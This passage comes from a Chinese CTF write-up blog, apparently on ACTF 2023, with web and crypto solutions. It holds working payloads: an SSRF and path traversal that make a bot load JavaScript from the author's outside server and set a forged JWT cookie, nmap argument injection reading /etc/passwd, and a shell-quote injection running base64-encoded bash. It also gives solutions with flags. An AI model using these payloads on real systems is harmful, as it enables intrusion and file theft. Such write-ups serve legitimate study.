=&gt;</span> <span class="string">`<span class="subst">$&#123;k&#125;</span>=<span class="subst">$&#123;v&#125;</span>`</span>).<span class="title function_">join</span>(<span class="string">&#x27;; &#x27;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123; code &#125;)</span><br><span class="line">    &#125;)).<span class="title function_">text</span>()</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;ok&#x27;</span> == data) &#123;</span><br><span class="line">        res.<span class="title function_">cookie</span>(<span class="string">&#x27;token&#x27;</span>, <span class="title function_">sign</span>(&#123; username, <span class="attr">isVip</span>: <span class="literal">true</span> &#125;))</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Congratulation! You are VIP now.&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(data)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>存在这样的漏洞</p>
<p><img src="/img/image-20231101180221084.png" alt="image-20231101180221084" /></p>
<p>那么就可以通过对username的控制来重定向到我们的vps来成为vip</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">return_ok</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">10086</span>)</span><br></pre></td></tr></table></figure>
<p>然后访问vip</p>
<p><img src="/img/image-20231101181914876.png" alt="image-20231101181914876" /></p>
<p>对于preview路由</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/preview&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; tex, theme &#125; = req.<span class="property">query</span></span><br><span class="line">    <span class="keyword">if</span> (!tex) &#123;</span><br><span class="line">        tex = <span class="string">&#x27;Today is \\today.&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> nonce = <span class="title function_">getNonce</span>(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">let</span> base = <span class="string">&#x27;https://cdn.jsdelivr.net/npm/latex.js/dist/&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (theme) &#123;</span><br><span class="line">        base = <span class="keyword">new</span> <span class="title function_">URL</span>(theme, <span class="string">`http://<span class="subst">$&#123;req.headers.host&#125;</span>/theme/`</span>) + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;preview.html&#x27;</span>, &#123; tex, nonce, base &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>同样URL可控第一个参数，访问</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/preview?tex=<span class="number">111</span>&amp;theme=<span class="comment">//43.139.154.219:10087/a</span></span><br></pre></td></tr></table></figure>
<p>即可访问/js路径下面的base.js文件</p>
<p>同时</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/share/:id&#x27;</span>, reportLimiter, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">params</span></span><br><span class="line">    <span class="keyword">if</span> (!id) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;no note id specified&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">`http://localhost:<span class="subst">$&#123;PORT&#125;</span>/note/<span class="subst">$&#123;id&#125;</span>`</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">visit</span>(url)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;done&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;something error&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p><code>req.params</code>会进行url解码，所以可以通过<code>../</code>编码之后用preview访问我们的vps(存在认证，需要vip身份)</p>
<p>至于为什么需要vip</p>
<p>因为</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> url = <span class="string">`http://localhost:<span class="subst">$&#123;PORT&#125;</span>/note/<span class="subst">$&#123;id&#125;</span>`</span></span><br></pre></td></tr></table></figure>
<p>会经过的是note路由的post方法，在这个方法的下面存在对其vip的判断</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/share/%2e%2e%2f%70%72%65%76%69%65%77%3f%74%65%78%3d%31%31%31%26%74%68%65%6d%65%3d%2f%2f%34%33%2e%31%33%39%2e%31%35%34%2e%32%31%39%3a%31%30%30%38%37%2f%61</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:3000</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imh0dHA6Ly80My4xMzkuMTU0LjIxOToxMDA4NiIsImlzVmlwIjp0cnVlLCJpYXQiOjE2OTg4MzAwNTN9.IGd1UPmSK0uoFJEC7WnbIH1mNqsxWX-pTOGDR8fuza7gb7j7Uuec0QJyqhsmEIS2UDIZCJyuKOIPnO6UZzYLK6plRcMRRaEGsIukcOYdI6gasZzomJK1Q5y4iWYM3PNgXSUfb-ck-P_CmG8lUKqXYIlujLXsEaHMT3lH2U7f4mP_6y_wZtg9H9rDzW7s2dhZ5hx4gJZKgMDAwgfl9UlE04CGgepkWPP40LryG4CKIADwmVbh5cVLw-Sn3W3-f53_tVCqAkIpQyDUtdEizZal4rYULlvpoll1hNkPoyATcggK3GoADKYIp7SRdPPxC3XqiO0usOrma4mupA7z7s82GA</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;118&quot;, &quot;Google Chrome&quot;;v=&quot;118&quot;, &quot;Not=A?Brand&quot;;v=&quot;99&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">sec-fetch-site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">sec-fetch-mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">sec-fetch-user</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">sec-fetch-dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>base.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> += <span class="string">&#x27;token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imh0dHA6Ly80My4xMzkuMTU0LjIxOToxMDA4NiIsImlzVmlwIjp0cnVlLCJpYXQiOjE2OTg4MzAwNTN9.IGd1UPmSK0uoFJEC7WnbIH1mNqsxWX-pTOGDR8fuza7gb7j7Uuec0QJyqhsmEIS2UDIZCJyuKOIPnO6UZzYLK6plRcMRRaEGsIukcOYdI6gasZzomJK1Q5y4iWYM3PNgXSUfb-ck-P_CmG8lUKqXYIlujLXsEaHMT3lH2U7f4mP_6y_wZtg9H9rDzW7s2dhZ5hx4gJZKgMDAwgfl9UlE04CGgepkWPP40LryG4CKIADwmVbh5cVLw-Sn3W3-f53_tVCqAkIpQyDUtdEizZal4rYULlvpoll1hNkPoyATcggK3GoADKYIp7SRdPPxC3XqiO0usOrma4mupA7z7s82GA&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&#x27;/vip&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="string">&#x27;code=1&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>然后nc一下就可以了<img src="/img/image-20231101203320236.png" alt="image-20231101203320236" /></p>
<h3 id="MyGO’s-Live">MyGO’s Live!!!</h3>
<p>nmap to RCE</p>
<p>之前在sekai打过类似的，当时是ruby语言</p>
<p><a href="https://gudiffany.github.io/2023/09/04/10-26-47/">https://gudiffany.github.io/2023/09/04/10-26-47/</a></p>
<p>但是限制了长度，无法直接利用现成的poc来打</p>
<p>但是其中一种可以通过<code>\t</code>来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checker?url=%09-iL%09/etc/passwd%09-oN%09public/index.html</span><br></pre></td></tr></table></figure>
<p><code>&#123;&#125;</code>可以使用这个进行代码块的执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checker?url=&#123;-iL,/flag-????????????????,-oN,public/index.html&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Ave-Mujica’s-Masquerade">Ave Mujica’s Masquerade</h3>
<p><a href="https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html">https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html</a></p>
<p>docker build 之后会提示CVE</p>
<p>然后看看文章，使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`:`command``:`</span><br></pre></td></tr></table></figure>
<p>进行包裹就可以执行命令了</p>
<p><img src="/img/image-20231101203320235.png" alt="image-20231101203320235" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:3333/checker?url=:`:`bash$IFS-c$IFS&#123;echo,Y3AgL2ZsYWcqIC9hcHAvcHVibGljL2ZsYWc=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;``:`</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 127.0.0.1:3333/flag -O flag</span><br></pre></td></tr></table></figure>
<h3 id="craftcms">craftcms</h3>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzkyNTYwNDgwMw==&amp;mid=2247483716&amp;idx=1&amp;sn=f7496da505c7043248c1632faf34a05b&amp;chksm=c1c54fe8f6b2c6fe1f6272577a41c16828ad8303a4520b4522ca5cf11e47c420b307707291dc&amp;mpshare=1&amp;scene=23&amp;srcid=10311We1Jpkp0EzxchznrcZ6&amp;sharer_shareinfo=899d2b0ed9d815b766606e0f6c671faf&amp;sharer_shareinfo_first=899d2b0ed9d815b766606e0f6c671faf#rd">https://mp.weixin.qq.com/s?__biz=MzkyNTYwNDgwMw==&amp;mid=2247483716&amp;idx=1&amp;sn=f7496da505c7043248c1632faf34a05b&amp;chksm=c1c54fe8f6b2c6fe1f6272577a41c16828ad8303a4520b4522ca5cf11e47c420b307707291dc&amp;mpshare=1&amp;scene=23&amp;srcid=10311We1Jpkp0EzxchznrcZ6&amp;sharer_shareinfo=899d2b0ed9d815b766606e0f6c671faf&amp;sharer_shareinfo_first=899d2b0ed9d815b766606e0f6c671faf#rd</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247487654&amp;idx=1&amp;sn=d02ba234aa0f3050658c577c8a9c5fd5&amp;chksm=cf53d010f82459066708ccdb963b6ea0c7b434963ecd2754b8f8d6b02ee18373bb9801a27eb1&amp;mpshare=1&amp;scene=23&amp;srcid=10317Rtf6W4ZAv2j8s0X0k6o&amp;sharer_shareinfo=fb58105346e7282087990aab00b71e07&amp;sharer_shareinfo_first=fb58105346e7282087990aab00b71e07#rd">https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247487654&amp;idx=1&amp;sn=d02ba234aa0f3050658c577c8a9c5fd5&amp;chksm=cf53d010f82459066708ccdb963b6ea0c7b434963ecd2754b8f8d6b02ee18373bb9801a27eb1&amp;mpshare=1&amp;scene=23&amp;srcid=10317Rtf6W4ZAv2j8s0X0k6o&amp;sharer_shareinfo=fb58105346e7282087990aab00b71e07&amp;sharer_shareinfo_first=fb58105346e7282087990aab00b71e07#rd</a></p>
<p>现成的cms来打，能够文件包含</p>
<p>第一种是session文件的条件竞争来RCE</p>
<p>第二种是pearcmd打RCE</p>
<h3 id="story">story</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Captcha</span>:</span><br><span class="line">    lookup_table: t.<span class="type">List</span>[<span class="built_in">int</span>] = [<span class="built_in">int</span>(i * <span class="number">1.97</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, width: <span class="built_in">int</span> = <span class="number">160</span>, height: <span class="built_in">int</span> = <span class="number">60</span>, key: <span class="built_in">int</span> = <span class="literal">None</span>, length: <span class="built_in">int</span> = <span class="number">4</span>, </span></span><br><span class="line"><span class="params">                 fonts: t.<span class="type">Optional</span>[t.<span class="type">List</span>[<span class="built_in">str</span>]] = <span class="literal">None</span>, font_sizes: t.<span class="type">Optional</span>[t.<span class="type">Tuple</span>[<span class="built_in">int</span>]] = <span class="literal">None</span></span>):</span><br><span class="line">        self._width = width</span><br><span class="line">        self._height = height</span><br><span class="line">        self._length = length</span><br><span class="line">        self._key = (key <span class="keyword">or</span> <span class="built_in">int</span>(time.time())) + random.randint(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line">        self._fonts = fonts <span class="keyword">or</span> DEFAULT_FONTS</span><br><span class="line">        self._font_sizes = font_sizes <span class="keyword">or</span> (<span class="number">42</span>, <span class="number">50</span>, <span class="number">56</span>)</span><br><span class="line">        self._truefonts: t.<span class="type">List</span>[FreeTypeFont] = []</span><br><span class="line">        random.seed(self._key)</span><br></pre></td></tr></table></figure>
<p>test</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>key = <span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>_key = key <span class="keyword">or</span> <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(_key)    </span><br><span class="line"><span class="number">1</span>   </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure>
<p>也就是说<code>key = int(time.time()) + random.randint(1,100)</code></p>
<p>然后爆破，之后ssti即可</p>
<p>本地环境起来没有验证码，打不了</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=Mzk0NjM5OTc1NQ==&amp;mid=2247483873&amp;idx=1&amp;sn=3b771293296edae5cf913c2bc85ba1a8&amp;chksm=c307fe85f4707793149c2aeebe76c086e375f9f666c143b68556e5fa358fa62694533cc630e8&amp;mpshare=1&amp;scene=23&amp;srcid=10317I620Rz9DLyGPvjH4heX&amp;sharer_shareinfo=fa0d322996aa33d12e0962e62f42eb67&amp;sharer_shareinfo_first=fa0d322996aa33d12e0962e62f42eb67#rd">https://mp.weixin.qq.com/s?__biz=Mzk0NjM5OTc1NQ==&amp;mid=2247483873&amp;idx=1&amp;sn=3b771293296edae5cf913c2bc85ba1a8&amp;chksm=c307fe85f4707793149c2aeebe76c086e375f9f666c143b68556e5fa358fa62694533cc630e8&amp;mpshare=1&amp;scene=23&amp;srcid=10317I620Rz9DLyGPvjH4heX&amp;sharer_shareinfo=fa0d322996aa33d12e0962e62f42eb67&amp;sharer_shareinfo_first=fa0d322996aa33d12e0962e62f42eb67#rd</a></p>
<h2 id="crypto">crypto</h2>
<h3 id="MDH">MDH</h3>
<p>靠北了，没看，不然秒了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">r = <span class="number">128</span></span><br><span class="line">c = <span class="number">96</span></span><br><span class="line">p = <span class="number">308955606868885551120230861462612873078105583047156930179459717798715109629</span></span><br><span class="line">Fp = GF(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>():</span><br><span class="line">    a1 = random_matrix(Fp, r, c)</span><br><span class="line">    a2 = random_matrix(Fp, r, c)</span><br><span class="line">    A = a1 * a2.T</span><br><span class="line">    <span class="keyword">return</span> (a1, a2), A</span><br><span class="line"></span><br><span class="line">sk_alice, pk_alice = gen()</span><br><span class="line">sk_bob, pk_bob = gen()</span><br><span class="line">shared = (sk_alice[<span class="number">0</span>].T * pk_bob * sk_alice[<span class="number">1</span>]).trace()</span><br><span class="line">ct = <span class="built_in">int</span>(sha256(<span class="built_in">str</span>(<span class="built_in">int</span>(shared)).encode()).hexdigest(), <span class="number">16</span>) ^^ <span class="built_in">int</span>.from_bytes(flag, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">    f.write(<span class="built_in">str</span>(ct).encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>(<span class="built_in">list</span>(pk_alice)).encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>(<span class="built_in">list</span>(pk_bob)).encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>对于这道题目给了<code>a1*a2.T</code>以及<code>b1*b2.T</code>，share是<code>a1.T * b1 * b2.T * a2</code>的迹</p>
<p>然后通过性质上来说乘法不会改变迹的数值，转置不会改变迹的数值</p>
<p>所以通过转置a1*a2.T，为a1.T * a2</p>
<p>就可以得到share</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sage: <span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">....: f = <span class="built_in">open</span>(<span class="string">r&#x27;./output.txt&#x27;</span>)</span><br><span class="line">....: p = <span class="number">308955606868885551120230861462612873078105583047156930179459717798715109629</span></span><br><span class="line">....: c = <span class="built_in">eval</span>(f.readline())</span><br><span class="line">....: </span><br><span class="line">....: pka = matrix(<span class="built_in">eval</span>(f.readline()))</span><br><span class="line">....: pkb = matrix(<span class="built_in">eval</span>(f.readline()))</span><br><span class="line">....: </span><br><span class="line">....: m = (pkb*pka.T).trace()</span><br><span class="line">....: m = m % p</span><br><span class="line">....: </span><br><span class="line">....: m = (c^^<span class="built_in">int</span>(sha256(<span class="built_in">str</span>(<span class="built_in">int</span>(m)).encode()).hexdigest(), <span class="number">16</span>))</span><br><span class="line">sage: <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">sage: long_to_bytes(m)</span><br><span class="line"><span class="string">b&#x27;ACTF&#123;do_you_know_f0rm2l1n_1s_4w3s0m3!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="easyRSA">easyRSA</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genKey</span>(<span class="params">nbits, dbits</span>):</span><br><span class="line">    bbits = (nbits // <span class="number">2</span> - dbits) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomNBitInteger(dbits)</span><br><span class="line">        b = getRandomNBitInteger(bbits)</span><br><span class="line">        c = getRandomNBitInteger(bbits)</span><br><span class="line">        p1 = a * b * c + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p1):</span><br><span class="line">            <span class="comment"># print(&quot;p1 =&quot;, p1)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d = getRandomNBitInteger(dbits)</span><br><span class="line">        p2 = b * c * d + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p2):</span><br><span class="line">            <span class="comment"># print(&quot;p2 =&quot;, p2)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        e = getRandomNBitInteger(bbits)</span><br><span class="line">        f = getRandomNBitInteger(bbits)</span><br><span class="line">        q1 = e * d * f + <span class="number">1</span></span><br><span class="line">        p3 = a * e * f + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(q1) <span class="keyword">and</span> isPrime(p3):</span><br><span class="line">            <span class="comment"># print(&quot;p3 =&quot;, p3)</span></span><br><span class="line">            <span class="comment"># print(&quot;q1 =&quot;, q1)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d_ = getRandomNBitInteger(dbits)</span><br><span class="line">        <span class="keyword">if</span> GCD(a * b * c * d * e * f, d_) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        e_ = inverse(d_, a * b * c * d * e * f)</span><br><span class="line">        k1 = (e_ * d_ - <span class="number">1</span>) // (a * b * c * d * e * f)</span><br><span class="line">        <span class="keyword">assert</span> e_ * d_ == (a * b * c * d * e * f) * k1 + <span class="number">1</span></span><br><span class="line">        q2 = k1 * e * f + <span class="number">1</span></span><br><span class="line">        q3 = k1 * b * c + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(q2) <span class="keyword">and</span> isPrime(q3):</span><br><span class="line">            <span class="comment"># print(&quot;q2 =&quot;, q2)</span></span><br><span class="line">            <span class="comment"># print(&quot;q3 =&quot;, q3)</span></span><br><span class="line">            <span class="comment"># print(&quot;e =&quot;, e_)</span></span><br><span class="line">            <span class="comment"># print(&quot;d =&quot;, d_)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    n1 = p1 * q1</span><br><span class="line">    n2 = p2 * q2</span><br><span class="line">    n3 = p3 * q3</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">pow</span>(<span class="built_in">pow</span>(<span class="number">0xdeadbeef</span>, e_, n1), d_, n1) == <span class="number">0xdeadbeef</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">pow</span>(<span class="built_in">pow</span>(<span class="number">0xdeadbeef</span>, e_, n2), d_, n2) == <span class="number">0xdeadbeef</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">pow</span>(<span class="built_in">pow</span>(<span class="number">0xdeadbeef</span>, e_, n3), d_, n3) == <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>(e_, n1, n2, n3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nbits = <span class="number">0x600</span></span><br><span class="line">dbits = <span class="number">0x210</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e, n1, n2, n3 = genKey(nbits, dbits)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n1 =&quot;</span>, n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n2 =&quot;</span>, n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n3 =&quot;</span>, n3)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>n1,n2,n3都是在同样接近的bit位下面，基本上的思路是构造格，至于为什么是2^(240+528)，因为在n1,n2,n3中都是在240和528bit位的数下面构成的（并且是素数），并且在构成n1,n2,n3的存在部分相同的数，就可以当作是一种公用的向量，那么为了寻找格，需要构造出一些表达式，然后由于n1,n2,n3的大小相近，近似可以看作是2^(240+528)为基准(单位向量)来构成的，所以在LLL之后，此处会是最短向量，也就是d</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">63442255298812942222810837512019302954917822996915527697525497640413662503768308023517128481053593562877494934841788054865410798751447333551319775025362132176942795107214528962480350398519459474033659025815248579631003928932688495682277210240277909527931445899728273182691941548330126199931886748296031014210795428593631253184315074234352536885430181103986084755140024577780815130067722355861473639612699372152970688687877075365330095265612016350599320999156644</span></span><br><span class="line">e = <span class="number">272785315258275494478303901715994595013215169713087273945370833673873860340153367010424559026764907254821416435761617347240970711252213646287464416524071944646705551816941437389777294159359383356817408302841561284559712640940354294840597133394851851877857751302209309529938795265777557840238332937938235024502686737802184255165075195042860413556866222562167425361146312096189555572705076252573222261842045286782816083933952875990572937346408235562417656218440227</span></span><br><span class="line">n1 = <span class="number">473173031410877037287927970398347001343136400938581274026578368211539730987889738033351265663756061524526288423355193643110804217683860550767181983527932872361546531994961481442866335447011683462904976896894011884907968495626837219900141842587071512040734664898328709989285205714628355052565784162841441867556282849760230635164284802614010844226671736675222842060257156860013384955769045790763119616939897544697150710631300004180868397245728064351907334273953201</span></span><br><span class="line">n2 = <span class="number">327163771871802208683424470007561712270872666244394076667663345333853591836596054597471607916850284565474732679392694515656845653581599800514388800663813830528483334021178531162556250468743461443904645773493383915711571062775922446922917130005772040139744330987272549252540089872170217864935146429898458644025927741607569303966038195226388964722300472005107075179204987774627759625183739199425329481632596633992804636690274844290983438078815836605603147141262181</span></span><br><span class="line">n3 = <span class="number">442893163857502334109676162774199722362644200933618691728267162172376730137502879609506615568680508257973678725536472848428042122350184530077765734033425406055810373669798840851851090476687785235612051747082232947418290952863499263547598032467577778461061567081620676910480684540883879257518083587862219344609851852177109722186714811329766477552794034774928983660538381764930765795290189612024799300768559485810526074992569676241537503405494203262336327709010421</span></span><br><span class="line"></span><br><span class="line">sad = <span class="number">2</span>^(<span class="number">240</span>+<span class="number">528</span>)</span><br><span class="line">m = matrix([[sad,e,e,e],[<span class="number">0</span>,n1+<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">0</span>,n2+<span class="number">1</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,n3+<span class="number">1</span>]])</span><br><span class="line">d = <span class="built_in">abs</span>(<span class="built_in">int</span>(m.LLL()[<span class="number">0</span>][<span class="number">0</span>]//sad))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n1)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line"><span class="string">b&#x27;ACTF&#123;5FFC427B-F14F-DCA0-C425-675B149890C2&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>2023wp</category>
      </categories>
      <tags>
        <tag>2023ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker</title>
    <url>/2023/11/23/23-05-29/</url>
    <content><![CDATA[<h1 id="Docker-更新中"><a href="#Docker-更新中" class="headerlink" title="Docker(更新中)"></a>Docker(更新中)</h1><span id="more"></span>
<p>先说说为什么要写这篇文章，大概只是记录一下两天啥也没搞出来的痛苦，总不能啥也没学会吧</p>
